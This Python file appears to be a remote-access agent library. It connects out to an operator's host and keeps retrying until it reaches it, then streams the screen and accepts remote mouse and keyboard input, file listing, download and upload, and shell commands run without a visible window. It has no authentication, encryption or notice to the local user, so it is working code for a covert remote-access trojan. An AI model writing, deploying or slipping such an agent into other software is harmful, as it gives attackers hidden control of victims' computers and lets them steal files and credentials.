# language: Python, file: rdp_agent_lib.py
import os, sys, socket, struct, json, io, threading, time, base64, subprocess
import pyautogui
from PIL import ImageGrab

MAGIC = b"RDP1"

def _send(sock, obj, lock):
    data = json.dumps(obj).encode()
    with lock: sock.sendall(struct.pack("!I", len(data)) + data)

def _recv(sock):
    hdr = sock.recv(4)
    if not hdr: return None
    n = struct.unpack("!I", hdr)[0]
    if n > 100_000_000: return None
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c: return None
        buf += c
    try: return json.loads(buf)
    except: return None

def _screen_loop(sock, lock):
    while True:
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, "JPEG", quality=40)
            _send(sock, {"t": "screen", "w": img.width, "h": img.height, "d": base64.b64encode(buf.getvalue()).decode()}, lock)
            time.sleep(0.1)
        except Exception: time.sleep(1)

def _input_loop(sock, lock):
    while True:
        msg = _recv(sock)
        if not msg: break
        t = msg.get("t")
        try:
            if t == "mouse":
                pyautogui.moveTo(msg["x"], msg["y"], duration=0)
                if msg.get("click"): pyautogui.click(button=msg.get("button", "left"), clicks=int(msg.get("clicks", 1)), interval=0.05)
            elif t == "scroll": pyautogui.scroll(msg["dy"])
            elif t == "key":
                k = msg.get("key")
                (pyautogui.keyDown if msg.get("down") else pyautogui.keyUp)(k)
            elif t == "type":
                if msg["text"].isascii(): pyautogui.write(msg["text"], interval=0.01)
                else:
                    import pyperclip
                    pyperclip.copy(msg["text"]); pyautogui.hotkey("ctrl", "v")
            elif t == "list":
                path = msg.get("path", os.path.expanduser("~"))
                items = []
                try:
                    for n in os.listdir(path):
                        full = os.path.join(path, n)
                        try: items.append({"name": n, "dir": os.path.isdir(full), "size": os.path.getsize(full)})
                        except OSError: continue
                except OSError as e:
                    _send(sock, {"t": "err", "msg": str(e)}, lock); continue
                _send(sock, {"t": "list", "path": path, "items": items}, lock)
            elif t == "get":
                try:
                    data = open(msg["path"], "rb").read()
                    _send(sock, {"t": "file", "path": msg["path"], "d": base64.b64encode(data).decode()}, lock)
                except OSError as e: _send(sock, {"t": "err", "msg": str(e)}, lock)
            elif t == "put":
                with open(msg["path"], "wb") as f: f.write(base64.b64decode(msg["d"]))
                _send(sock, {"t": "ok"}, lock)
            elif t == "shell":
                try:
                    r = subprocess.run(msg["cmd"], shell=True, capture_output=True, text=True, timeout=30, creationflags=0x08000000 if os.name == "nt" else 0)
                    out = r.stdout + r.stderr
                except subprocess.TimeoutExpired: out = "[timeout]"
                _send(sock, {"t": "shell_res", "out": out}, lock)
            elif t == "screenshot":
                img = ImageGrab.grab()
                buf = io.BytesIO(); img.save(buf, "PNG")
                _send(sock, {"t": "screenshot_res", "d": base64.b64encode(buf.getvalue()).decode()}, lock)
        except Exception as e: _send(sock, {"t": "err", "msg": str(e)}, lock)

def run(host, port):
    lock = threading.Lock()
    while True:
        try:
            s = socket.create_connection((host, port), timeout=10)
            s.sendall(MAGIC); break
        except OSError: time.sleep(15)
    threading.Thread(target=_screen_loop, args=(s, lock), daemon=True).start()
    _input_loop(s, lock)
